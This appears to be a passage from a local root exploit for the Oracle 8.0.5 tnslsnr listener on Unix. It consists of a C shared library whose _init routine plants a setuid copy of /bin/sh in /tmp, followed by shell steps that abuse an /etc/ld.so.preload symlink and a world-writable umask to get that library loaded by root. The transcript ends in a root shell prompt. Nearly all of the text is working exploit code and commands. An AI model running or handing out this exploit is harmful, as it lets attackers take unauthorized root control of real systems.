
#include <unistd.h>
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init()
{

  if (!geteuid()) {

  remove("/etc/ld.so.preload");

  execl("/bin/bash","bash","-c","/bin/cp /bin/sh /tmp/xxxx ; /bin/chmod +xs /tmp/xxxx",NULL);

  }

}
*/
$ gcc -o oracle-ex.o -c oracle-ex.c -fPIC
$ gcc  -shared -Wl,-soname,libno_ex.so.1 -o libno_ex.so.1.0 oracle-ex.o -nostartfiles

$  unset ORACLE_HOME

$  umask 0000
$  ln -s /etc/ld.so.preload  /tmp/listener.log
$  /u01/app/oracle/product/8.0.5/bin/tnslsnr

$ echo /tmp/libno_ex.so.1.0 >/etc/ld.so.preload

$ telnet localhost

Trying ...
Connected to localhost.localdomain.
Escape character is '^]'.
Connection closed by foreign host.

$ ./xxxx
#
/*
